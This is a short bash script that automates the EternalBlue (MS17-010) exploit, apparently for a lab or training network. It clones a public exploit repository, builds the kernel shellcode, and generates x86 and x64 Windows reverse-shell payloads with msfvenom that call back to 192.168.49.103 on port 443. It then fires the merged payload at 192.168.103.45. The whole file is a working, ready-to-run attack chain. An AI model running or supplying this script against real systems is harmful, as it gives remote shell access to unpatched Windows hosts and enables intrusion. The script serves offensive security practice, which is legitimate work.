#!/bin/bash

echo "[+] This script compiles the steps discussed at the link below: "
echo " -  https://root4loot.com/post/eternalblue_manual_exploit/"
git clone https://github.com/worawit/MS17-010.git 

nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.49.103 --platform windows -a x64 --format raw -o sc_x64_payload.bin
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin

nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.49.103 --platform windows -a x86 --format raw -o sc_x86_payload.bin
cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin

python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
python MS17-010/eternalblue_exploit7.py 192.168.103.45 sc_all.bin
